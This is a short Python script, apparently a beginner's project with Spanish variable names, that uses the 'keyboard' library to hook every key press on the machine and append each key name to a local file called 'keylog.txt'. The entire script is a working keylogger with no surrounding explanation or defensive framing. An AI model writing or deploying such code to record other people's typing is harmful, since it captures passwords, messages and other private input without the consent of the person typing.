import keyboard

def teclas(key):
    with open("keylog.txt", "a") as archivo:
        if key.name == "space":
            archivo.write(" ")
        else:
            archivo.write(key.name)

keyboard.on_press(teclas)

keyboard.wait()
